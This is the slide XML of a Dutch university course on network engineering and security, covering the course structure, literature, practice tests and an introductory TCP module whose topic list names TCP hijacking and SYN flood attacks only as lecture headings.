            </a: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Bedreigingen en bijbehorende tegenmaatregelen op het gebied van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netwerkbeveiliging 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341280" indent="-3412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Basisconcepten van </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2000" b="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>forensisch onderzoek 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en het verzamelen van bewijs in netwerken</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="217" name="CustomShape 4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E162631-8E26-4203-BB7A-BA0B557DAEB6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4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7AC79E-5120-4840-AFFF-30F25EA3D6C7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5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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="9442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Literatuur</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="223" name="TextShape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2099880"/>
            <a:ext cx="4122720" cy="40258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2720" lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="298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2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600" b="0" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>J.F. Kurose &amp; K.W. Ross, Computer networking,</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="0" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>a top-down approach, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="0" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>th edition Pearson </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" spc="-1" baseline="30000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>th</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" spc="-1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ook</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" spc="-1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>goed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="nl-NL" sz="1200" b="1" i="1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nl-NL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224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</a:rPr>
              <a:t>Network Forensics: Tracking hackers through cyberspace, Davidoff and Ham, Prentice Hall</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="nl-NL" sz="9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 marL="34272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600" b="0" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Materiaal en artikelen op DLO</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342720" indent="-34272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342720" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="298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600" b="0" i="1" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Heb je de boeken al?</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:endParaRPr lang="nl-NL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9" descr="http://www-fp.pearsonhighered.com/assets/hip/images/bigcovers/0132564718.jpg"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5403960" y="3414600"/>
            <a:ext cx="1887480" cy="2451240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="225" name="Picture 9" descr="Afbeeldingsresultaat voor kurose ross 7th"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6813720" y="1192320"/>
            <a:ext cx="1873080" cy="2320920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="226" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7941600" y="3606840"/>
            <a:ext cx="83448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</a:rPr>
              <a:t>Figuur 3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="227" name="CustomShape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6555600" y="5878440"/>
            <a:ext cx="83448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</a:rPr>
              <a:t>Figuur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ACF167F-46F1-4338-8643-0C85B3B69CF4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6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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="9442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Opzet van het vak</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="230" name="TextShape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2099880"/>
            <a:ext cx="8229600" cy="40258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Het vak bestaat uit:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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(Video) colleges, waar de theorie wordt toegelicht</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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Practicumopdrachten (labs), waar de theorie in praktijk wordt gebracht </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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Te bestuderen literatuur </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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Oefentoetsen op de DLO, waarmee je zelf kunt toetsen of je de stof voldoende beheerst </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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Een afsluitend tentamen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rm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03F7D0B-2CDC-4BDE-9722-7D595B1B9519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7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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="9442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0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Oefentoetsen</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="3200" b="0" strike="noStrike" spc="-1">
              <a:solidFill>
                <a:srgbClr val="25167A"/>
              </a:solidFill>
              <a:latin typeface="Arial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456840" y="2015640"/>
            <a:ext cx="7961400" cy="41086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7000"/>
          </a:bodyPr>
          <a:lstStyle/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Elke module is er een oefentoets </a:t>
            </a:r>
          </a:p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Deze helpen je bij de voorbereiding op het tentamen.</a:t>
            </a:r>
          </a:p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De oe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" b="1" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>f</a:t>
            </a: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entoetsen kun je </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>zelf</a:t>
            </a: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 maken</a:t>
            </a:r>
          </a:p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Ze worden niet nagekeken, maar na het maken van de oefentoets krijg je de goede antwoorden te zien</a:t>
            </a:r>
          </a:p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Op deze wijze kun je zelf je score bepalen en krijg je inzicht in welke onderdelen van de stof je al wel - of niet - voldoende beheerst</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342720" indent="-342720"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De oefentoetsen tellen </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" b="1" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>niet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" b="0" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> mee voor je resultaat voor het vak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B94C778-2149-4AA0-BC64-B0C28BA78810}" type="slidenum">
              <a:rPr lang="en-US" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>8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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="431640" y="563400"/>
            <a:ext cx="8229600" cy="11685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DLO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="239" name="TextShape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="431640" y="1581120"/>
            <a:ext cx="8229600" cy="4757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Al het materiaal voor dit vak vind je op DLO.</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:br>
              <a:rPr dirty="0"/>
            </a:b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Onder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Content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vind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je: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Studiehandleiding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met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leeswijzer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voor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literatuur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Video’s over de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lesstof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Sheets van de colleges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Studiemateriaal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en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aanvullende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artikelen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Practicumopdrachten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685800" lvl="1" indent="-343080"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</a:tabLst>
            </a:pP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Op DLO lever je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ook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alle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practicumopdrachten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in.</a:t>
            </a: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Afbeelding 1"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6037200" y="1430280"/>
            <a:ext cx="2733840" cy="219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Shape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="706320"/>
            <a:ext cx="8229600" cy="11685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Netwerk blog</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="252" name="TextShape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1628640"/>
            <a:ext cx="8229600" cy="47577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Onze informatiemaatschappij kan niet functioneren, zonder de onderwerpen die in dit vak worden behandeld. Deze thema’s verschijnen dus regelmatig in het nieuws.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Als je wilt weten hoe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haaien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het Internet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opaten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, of meer wilt weten over het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geheime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transport protocol waar wij je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niets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over vertellen…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Volg dan ons blog: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	</a:t>
            </a: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networksinthenews.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="253" name="CustomShape 3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4EEEC08-DD3C-4EAA-AB12-99CEFA2EB7B1}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>9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2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5597640" y="3868560"/>
            <a:ext cx="2585880" cy="2587680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="255" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7458840" y="6442200"/>
            <a:ext cx="834480" cy="30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</a:rPr>
              <a:t>Figure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8516880" y="648972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6265EB2C-9AEE-48F0-BB83-57B7C7D6C778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10</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="201" name="TextShape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="517680" y="167328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nl-NL" sz="3200" b="0" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Network Engineering</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:endParaRPr lang="nl-NL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Shape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="517680" y="251460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tIns="0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</a:rPr>
              <a:t>The TCP connection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="203" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8516880" y="6489720"/>
            <a:ext cx="626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74C66A89-507D-4A90-B71B-29B599EB829A}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="10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83153-C452-DC46-853E-68A381EE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module - TCP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1E2E92E-B9DE-604A-A8BE-F50CAF52979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828800"/>
            <a:ext cx="8229600" cy="4572000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>Lezen K&amp;R 2.7, 3.5, 3.7 (tot TCP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0" err="1"/>
              <a:t>Cubic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>Lezen </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" dirty="0"/>
              <a:t>The Internet Protocol Journal (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" dirty="0" err="1"/>
              <a:t>december</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" dirty="0"/>
              <a:t> 2006) SYN Flooding Attacks </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" i="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>zie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" i="1" dirty="0"/>
              <a:t> DLO)</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>Hoorcollege</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>2 Video’s (van </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0" err="1"/>
              <a:t>HvA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t> docent </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400"/>
              <a:t>Ivo Nijhuis)</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>Inrichten omgeving</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>Linux workshops (twee)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>NMAP lab</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0"/>
              <a:t>UDP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400" dirty="0" err="1"/>
              <a:t>pinger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2400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940727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5167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The TCP/IP model</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL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14050D7-6787-4507-8FE7-A8724370A2BB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12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207" name="Afbeelding 11"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5548320" y="1332000"/>
            <a:ext cx="3333240" cy="4533480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6119640" y="2268360"/>
            <a:ext cx="2355480" cy="50292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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5548320" y="594684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210" name="Picture 9" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1766880"/>
            <a:ext cx="3762000" cy="139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25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Quiz</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL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endParaRPr lang="nl-NL" sz="20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nl-NL" sz="2000" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>In welke laag horen de protocollen UDP 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nl-NL" sz="2000" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>e</a:t>
            </a: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n TCP?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nl-NL" sz="2000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320"/>
              </a:spcBef>
              <a:buAutoNum type="alphaUcParenR"/>
              <a:tabLst>
                <a:tab pos="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Application</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buAutoNum type="alphaUcParenR"/>
              <a:tabLst>
                <a:tab pos="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Transport</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buAutoNum type="alphaUcParenR"/>
              <a:tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="nl-NL" sz="2000" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buAutoNum type="alphaUcParenR"/>
              <a:tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Link</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="206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14050D7-6787-4507-8FE7-A8724370A2BB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13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207" name="Afbeelding 11"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5548320" y="1332000"/>
            <a:ext cx="3333240" cy="4533480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6119640" y="2268360"/>
            <a:ext cx="2355480" cy="50292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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5548320" y="594684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210" name="Picture 9" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1766880"/>
            <a:ext cx="3762000" cy="139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46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The TCP connection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Reminder: Transport Layer</a:t>
            </a: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Reliable Data Transfer in TCP</a:t>
            </a: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Sequence &amp; Acknowledgement nrs</a:t>
            </a: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Congestion control</a:t>
            </a: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TCP hijacking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-456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>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>TCP SYN flood attacks</a:t>
            </a:r>
          </a:p>
          <a:p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14050D7-6787-4507-8FE7-A8724370A2BB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14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207" name="Afbeelding 11"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5548320" y="1332000"/>
            <a:ext cx="3333240" cy="4533480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6119640" y="2268360"/>
            <a:ext cx="2355480" cy="50292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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5548320" y="594684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210" name="Picture 9" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1766880"/>
            <a:ext cx="3762000" cy="139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07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E3F40A3-AFDE-4B0D-AA4A-B6357B289B9F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15</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="212" name="Group 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5102280" y="1601640"/>
            <a:ext cx="3539880" cy="4545000"/>
            <a:chOff x="5102280" y="1601640"/>
            <a:chExt cx="3539880" cy="4545000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="213" name="CustomShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5102280" y="1768320"/>
              <a:ext cx="1736280" cy="1071360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b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14" name="Group 4"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5270400" y="3103560"/>
              <a:ext cx="1458720" cy="933120"/>
              <a:chOff x="5270400" y="3103560"/>
              <a:chExt cx="1458720" cy="933120"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="215" name="CustomShape 5"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5504400" y="3367440"/>
                <a:ext cx="986760" cy="66924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16" name="CustomShape 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5270400" y="3103560"/>
                <a:ext cx="1458720" cy="317520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217" name="CustomShape 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5264280" y="4481640"/>
              <a:ext cx="3225600" cy="1665000"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b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8" name="Line 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="7937280" y="5025960"/>
              <a:ext cx="139680" cy="523800"/>
